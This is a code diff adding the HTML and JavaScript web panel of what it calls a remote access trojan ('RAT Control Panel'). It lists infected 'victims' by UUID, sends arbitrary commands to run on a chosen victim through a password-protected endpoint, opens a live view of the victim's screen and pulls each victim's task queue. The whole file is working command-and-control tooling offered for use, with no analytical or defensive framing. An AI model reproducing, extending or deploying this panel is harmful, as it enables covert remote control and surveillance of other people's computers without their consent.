@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Control Panel</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #121212; color: #fff; margin: 0; padding: 20px; }
+        .container { max-width: 800px; margin: 0 auto; }
+        h1 { color: #00ff00; text-align: center; }
+        .victim-list { margin: 20px 0; }
+        .victim { background: #1e1e1e; padding: 10px; margin: 5px 0; border-radius: 5px; }
+        .victim-id { color: #00ff00; font-weight: bold; }
+        .btn { background: #00ff00; color: #000; border: none; padding: 5px 10px; cursor: pointer; margin: 5px; }
+        .btn:hover { background: #00aa00; }
+        .command-form { margin: 20px 0; }
+        input, textarea { width: 100%; padding: 8px; margin: 5px 0; background: #333; color: #fff; border: none; }
+        textarea { height: 100px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>RAT Control Panel</h1>
+
+        <div class="victim-list" id="victimList">
+            <!-- Список жертв будет загружен здесь -->
+        </div>
+
+        <div class="command-form">
+            <h2>Send Command</h2>
+            <input type="text" id="victimId" placeholder="Victim UUID">
+            <textarea id="command" placeholder="Command to execute"></textarea>
+            <button class="btn" onclick="sendCommand()">Send</button>
+        </div>
+    </div>
+
+    <script>
+        async function fetchVictims() {
+            const response = await fetch('/');
+            const victims = await response.text();
+            const victimList = document.getElementById('victimList');
+            victimList.innerHTML = victims.split('\n').map(victim => {
+                if (victim.trim() === '') return '';
+                return `<div class="victim">
+                    <span class="victim-id">${victim}</span>
+                    <button class="btn" onclick="viewScreen('${victim}')">View Screen</button>
+                    <button class="btn" onclick="getTasks('${victim}')">Get Tasks</button>
+                </div>`;
+            }).join('');
+        }
+
+        async function sendCommand() {
+            const victimId = document.getElementById('victimId').value;
+            const command = document.getElementById('command').value;
+            const response = await fetch('/prikaz', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ password: 'gAZan6742', victim: victimId, prikaz: command })
+            });
+            const result = await response.json();
+            alert(result.msg);
+        }
+
+        async function viewScreen(uuid) {
+            window.location.href = `/watch.html?uuid=${uuid}`;
+        }
+
+        async function getTasks(uuid) {
+            const response = await fetch('/getMyTasks', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ uuid })
+            });
+            const result = await response.json();
+            alert(result.tasks.join('\n'));
+        }
+
+        fetchVictims();
+    </script>
+</body>
+</html>
